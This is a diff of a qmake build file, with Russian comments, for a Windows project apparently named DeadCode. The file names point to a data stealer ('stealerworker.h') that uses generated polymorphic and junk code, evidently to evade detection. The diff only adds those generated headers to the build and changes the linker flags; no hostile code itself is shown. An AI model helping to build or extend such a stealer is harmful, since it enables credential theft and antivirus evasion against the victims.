@@ -16,7 +16,9 @@ HEADERS += \
     mainwindow.h \
     ../src/build_key.h \
     ../src/polymorphic_code.h \
+    ../src/polymorphic_code_generated.h \
     ../src/junk_code.h \
+    ../src/junk_code_generated.h \
     ../src/stealerworker.h
 
 # Файлы интерфейса (.ui)
@@ -71,11 +73,11 @@ QMAKE_CXXFLAGS += -O2 \
                   -Wno-deprecated-declarations \
                   -Wno-cast-function-type
 
-# Флаги линковки (исправлено для MinGW)
+# Флаги линковки
 QMAKE_LFLAGS += -static \
-                -Wl,--dynamicbase \
-                -Wl,-subsystem,windows \
-                -Wl,-s
+                -DYNAMICBASE \
+                -NXCOMPAT \
+                -SUBSYSTEM:WINDOWS
 
 # Определения для сборки (добавляем дату сборки и версию из git)
 BUILD_DATE = $$system(powershell -Command "Get-Date -Format 'yyyy-MM-dd'")
@@ -100,7 +102,9 @@ QMAKE_CLEAN += \
     ../build/DeadCode.exe \
     ../release/*.o \
     ../release/*.cpp \
-    ../release/*.h
+    ../release/*.h \
+    ../src/polymorphic_code_generated.h \
+    ../src/junk_code_generated.h
 
 # Дополнительные проверки и зависимости для Windows
 win32 {
@@ -117,5 +121,7 @@ win32 {
 PRE_TARGETDEPS += \
     ../src/build_key.h \
     ../src/polymorphic_code.h \
+    ../src/polymorphic_code_generated.h \
     ../src/junk_code.h \
+    ../src/junk_code_generated.h \
     ../src/stealerworker.h
